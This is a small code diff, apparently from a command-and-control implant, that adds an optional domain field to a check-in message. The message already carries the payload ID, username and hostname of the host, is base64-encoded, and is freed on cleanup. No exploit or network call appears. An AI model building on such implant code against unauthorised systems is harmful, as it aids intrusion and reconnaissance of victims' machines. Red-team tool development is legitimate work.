@@ -65,6 +65,19 @@ char *generate_checkin_message(CheckinRequest *checkin) {
 	msg[offset] = 0;
 	offset++;
 	
+	// Optional domain field.
+	if (checkin->domain != 0) {
+		int domain_len = MSVCRT$strlen(checkin->domain);
+		for (int i = 0; i < domain_len; i++) {
+			msg[offset] = checkin->domain[i];
+			offset++;
+		}
+	}
+	
+	// Add the null byte (if there was no domain field, this represents an empty string).
+	msg[offset] = 0;
+	offset++;	
+	
 	// Base64-encode the serialized message.
 	char *encoded_msg = KERNEL32$VirtualAlloc(0, len * 1.5, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 	base64_encode(msg, offset, encoded_msg);
@@ -93,6 +106,7 @@ void free_checkin_request(CheckinRequest *request) {
 	if (request->payload_uuid != NULL) { KERNEL32$VirtualFree(request->payload_uuid, 0, MEM_RELEASE); }
 	if (request->username != NULL) { KERNEL32$VirtualFree(request->username, 0, MEM_RELEASE); }
 	if (request->hostname != NULL) { KERNEL32$VirtualFree(request->hostname, 0, MEM_RELEASE); }
+	if (request->domain != NULL) { KERNEL32$VirtualFree(request->domain, 0, MEM_RELEASE); }
 }
 
 void free_checkin_reply(CheckinReply *reply) {
